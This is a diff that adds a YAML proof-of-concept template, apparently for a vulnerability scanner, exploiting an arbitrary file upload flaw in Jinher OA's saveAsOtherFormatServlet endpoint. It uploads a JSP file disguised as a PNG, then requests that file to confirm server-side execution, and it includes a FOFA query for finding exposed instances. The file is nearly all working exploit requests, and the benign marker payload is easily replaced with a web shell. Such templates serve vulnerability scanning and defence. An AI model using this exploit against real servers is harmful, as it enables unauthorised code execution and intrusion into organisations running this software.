@@ -1,0 +1,31 @@
+id: poc-yaml-jinher-oa-saveasotherformatservlet-interface-anyfile-upload
+info:
+  name: 金和OA saveAsOtherFormatServlet接口任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 金和OA 协同办公管理系统
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_str(4)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /jc6/servlet/saveAsOtherFormatServlet?fileName={{.t1}}.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=74f0dc3df975274386a11be68cacc0e5
+  data: '--74f0dc3df975274386a11be68cacc0e5
+
+    Content-Disposition: form-data; name="FileBlod"; filename="123.jsp"
+
+    Content-Type: image/png
+
+
+    <% out.println("{{.t2}}");%>
+
+    --74f0dc3df975274386a11be68cacc0e5--'
+  expression: status_code == 200 && contains(body,"OK")
+- method: GET
+  path: /jc6/upload/gwzw/{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,t2)
+transport: http
